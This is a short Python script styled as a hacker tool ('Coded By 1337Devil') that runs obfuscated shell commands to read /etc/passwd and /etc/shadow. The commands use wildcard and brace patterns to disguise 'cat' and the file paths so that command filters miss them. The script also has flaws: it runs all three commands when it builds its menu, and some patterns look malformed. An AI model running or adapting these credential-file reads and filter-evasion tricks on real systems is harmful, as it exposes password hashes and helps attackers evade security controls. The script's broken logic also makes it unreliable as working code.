
# Coded By 1337Devil :)
# import os command ..
import os

# import pyfiglet module
import pyfiglet

ascii_banner = pyfiglet.figlet_format("1337Devil")
print(ascii_banner)
print("                   Thanks To Mr.hEx020")
print("                   Thanks To ThEhilL")
print("                   Greets To My Friends")


def a():
    return os.system('{/***/ca*,/**c/****wd}')
def b():
    return os.system('/***/[c][a]* /**[c]/*****[d]')
def c():
    return os.system('/***/ca*,/**c/****ow}')
def op(x) :
    switcher={
        1: a(),
        2: b(),
        3: c(),
    }
    return switcher.get(x, "your option not available")
print("Press 1 Or 2 to read passwd file , and 3 to read shadow file ")
n=int(input("Enter your Choice: "))
c=op (n)
print(c)
